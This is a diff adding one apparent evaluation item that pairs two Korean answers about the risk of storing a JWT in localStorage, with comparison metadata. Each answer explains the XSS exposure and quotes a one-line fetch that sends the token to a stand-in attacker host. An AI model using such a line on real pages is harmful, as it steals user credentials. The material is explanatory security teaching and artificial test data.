@@ -1,0 +1,18 @@
+{
+  "id": "lo_11",
+  "prompt": "Is storing the JWT in localStorage a security problem here? Why?\n\nlocalStorage.setItem('jwt', token);",
+  "A": "네, 보안 문제가 맞습니다. 핵심은 **XSS(Cross-Site Scripting) 노출**입니다.\n\n`localStorage`는 같은 origin에서 실행되는 **모든 JavaScript가 제약 없이 읽을 수 있는** 저장소입니다. `HttpOnly`·`Secure` 같은 보호 플래그가 존재하지 않습니다. 따라서 페이지 어딘가에 XSS 취약점이 하나라도 있으면 — 직접 짠 코드든, 서드파티 스크립트(광고/분석/위젯)든, 의존성 공급망 공격이든 — 주입된 스크립트가 이렇게 토큰을 통째로 탈취할 수 있습니다:\n\n```js\nfetch('https://evil.example/steal?t=' + localStorage.getItem('jwt'));\n```\n\n토큰이 탈취되면 공격자는 만료 시점까지 그 사용자로 완전히 위장(impersonation)할 수 있습니다. JWT는 보통 stateless라 서버에서 즉시 무효화하기도 어렵습니다.\n\n**왜 \"쿠키보다 위험하냐\"는 점이 포인트입니다.** 토큰을 `HttpOnly` 쿠키에 넣으면 JavaScript에서 `document.cookie`로 읽을 수 없어, 동일한 XSS가 발생해도 토큰 값 자체는 빠져나가지 못합니다. localStorage에는 이 방어선이 아예 없습니다.\n\n추가로 알아둘 점:\n- **CSRF와는 트레이드오프 관계.** localStorage 방식은 토큰을 명시적으로 헤더(`Authorization: Bearer ...`)에 실으므로 자동 전송이 안 되어 CSRF에는 오히려 강합니다. 쿠키 방식은 CSRF 대비(`SameSite`, CSRF 토큰)가 필요합니다. 즉 \"localStorage = 무조건 나쁨\"이 아니라 **위협 모델을 바꾸는** 선택입니다.\n- **XSS의 영향 범위가 다릅니다.** HttpOnly 쿠키여도 XSS가 있으면 공격자가 그 페이지에서 인증된 요청을 보낼 수는 있습니다. 다만 토큰을 \"들고 나가\" 다른 곳에서 영구적으로 재사용하는 건 막힙니다 — 이 차이가 큽니다.\n\n**권장 방향:** 일반적으로 토큰은 `HttpOnly` + `Secure` + `SameSite` 쿠키에 두는 것이 1순위입니다. SPA 구조상 쿠키가 곤란하다면, access token은 메모리(JS 변수)에만 두고 짧게(수분) 만료시키며, refresh token은 `HttpOnly` 쿠키에 두는 패턴이 차선책입니다. 어느 쪽이든 **localStorage에 장기 토큰을 평문으로 두는 것**이 가장 취약한 선택입니다.\n\n요약하면, 이 한 줄의 문제는 \"암호화를 안 해서\"가 아니라 **저장 위치 자체가 JavaScript에 완전히 노출되어 XSS 한 방에 토큰이 새어나가기 때문**입니다.",
+  "B": "네, 잠재적 보안 문제입니다. 핵심은 **XSS(크로스 사이트 스크립팅)에 그대로 노출된다**는 점입니다.\n\n`localStorage`는 같은 출처(origin)에서 실행되는 **모든 자바스크립트가 읽을 수 있습니다.** JWT는 그 자체로 인증 자격증명(bearer token)이라서, 페이지에서 악성 스크립트가 한 번이라도 실행되면 — 취약한 npm 의존성, 침해된 서드파티/광고/애널리틱스 스크립트, 저장형 XSS 등 — 공격자가 다음 한 줄로 토큰을 통째로 빼낼 수 있습니다.\n\n```js\nfetch('https://attacker.example/steal?t=' + localStorage.getItem('jwt'));\n```\n\n토큰이 유출되면 만료될 때까지 공격자가 사용자를 완전히 가장할 수 있습니다.\n\n부차적인 문제도 있습니다.\n- **자동 만료/정리가 없습니다.** 명시적으로 `removeItem` 하기 전까지 탭·세션을 넘어 계속 남습니다.\n- 같은 출처의 **모든 스크립트에 무차별 노출**됩니다. 토큰만 따로 격리할 방법이 없습니다.\n\n**더 안전한 대안 — `HttpOnly` + `Secure` + `SameSite` 쿠키.** `HttpOnly` 쿠키는 자바스크립트가 읽을 수 없어서, XSS가 발생해도 토큰 자체를 직접 탈취하지는 못합니다. 대신 쿠키는 CSRF 위험이 생기는데, 이는 `SameSite=Strict`(또는 `Lax`) + CSRF 토큰으로 막습니다.\n\n한 가지 균형 잡힌 시각도 덧붙이면: \"XSS가 뚫리면 어차피 끝(공격자가 사용자 대신 요청을 보낼 수 있음)\"이라는 반론도 있습니다. 맞는 말이지만, `HttpOnly` 쿠키는 **토큰이 외부로 새어나가 재사용·재생되는 것**을 막아준다는 점에서 의미가 있습니다. 유출된 토큰은 그 출처를 벗어나 어디서든 쓸 수 있기 때문입니다.\n\n권장: 액세스 토큰은 짧게(예: 15분) 두고 `HttpOnly` 쿠키에 담으며, 리프레시 토큰도 `HttpOnly`로 두는 방식이 일반적인 모범 사례입니다. `localStorage`에 두어야 한다면 최소한 XSS 방어(CSP, 입력 이스케이프, 의존성 점검)와 짧은 만료 시간을 반드시 병행하세요.",
+  "mA": {
+    "leadsVerdict": 0,
+    "opensWalkthrough": 0,
+    "firstSent": "네, 보안 문제가 맞습니다.",
+    "words": 234
+  },
+  "mB": {
+    "leadsVerdict": 0,
+    "opensWalkthrough": 0,
+    "firstSent": "네, 잠재적 보안 문제입니다.",
+    "words": 202
+  }
+}
